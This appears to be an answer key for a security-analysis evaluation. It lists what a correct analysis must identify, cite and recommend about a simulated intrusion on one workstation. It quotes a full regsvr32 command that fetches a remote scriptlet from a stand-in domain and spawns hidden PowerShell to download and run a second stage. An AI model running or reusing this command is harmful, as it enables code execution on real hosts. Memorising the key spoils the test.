# Ground truth — scriptlet-proxy-exec

Hand-authored v3 intake. Machine-checkable form: `scriptlet-proxy-exec.expected.json`. Within two seconds on `corpws44`, Sysmon recorded `EXCEL.EXE` (opening `remittance-0811.xlsm`) spawning `regsvr32.exe /s /n /u /i:https://cdn.files-sync.example/s/upd.sct scrobj.dll` (rule `100921`, event 1), regsvr32 resolving `cdn.files-sync.example` (rule `100922`, event 22) and connecting to `203.0.113.87:443` from source port 50744 (rule `100923`, event 3), and regsvr32 spawning `powershell.exe -nop -w hidden` that downloads and runs `stage2.ps1` from the same domain (rule `100924`, event 1). The network sensor `corpnsm05` raised a Suricata alert on the same connection (rule `100926`, SID `1000131`: same source port, destination and SNI). A correct CASA analysis must land the points below.

## Must identify

- [ ] **One execution chain** on `corpws44`: Office parent, regsvr32 remote scriptlet, DNS and connection to `203.0.113.87:443`, hidden PowerShell child.
- [ ] The regsvr32 command line is **signed-binary proxy execution of a remote scriptlet** (T1218.010), not a DLL registration.
- [ ] The Suricata alert is the **same connection** as the Sysmon event 3 and an independent second source.
- [ ] The PowerShell child is **follow-on execution** (T1059.001): the chain went past the scriptlet fetch.
- [ ] Confidence **High**, justified by two independent sources and no plausible benign reading.
- [ ] Options: **isolate `corpws44`** (containment, with its trade-off); collect the workbook, `upd.sct` and `stage2.ps1`; search other hosts for the domain and address.

## Must not

- [ ] Present the regsvr32 activity as a routine registration, install or update.
- [ ] State what `upd.sct` or `stage2.ps1` contain or did; the intake shows neither.

## Must cite

- [ ] Rule IDs `100921`, `100922`, `100923`, `100924`, `100926`; the host `corpws44`.
- [ ] MITRE: T1218.010 (System Binary Proxy Execution: Regsvr32), T1059.001 (PowerShell).

## Must map / recommend

- [ ] NIST CSF 2.0: **DETECT** and **RESPOND** (containment is in scope at High).
- [ ] Route to `casa:endpoint-analyst` (process chain), `casa:network-analyst` (the TLS connection and SNI), `casa:detection-engineer` (a supported finding at High).

## Confidence

- [ ] **High.** Direct evidence (process creation with full command lines, the DNS query and the connection); documented techniques (T1218.010, T1059.001); two independent sources, host Sysmon and the network sensor, agreeing on one connection; and no plausible benign reading of an Office process launching regsvr32 against a remote `.sct` that then spawns hidden PowerShell. The window is not truncated and the baseline is present, so no minus modifier applies.
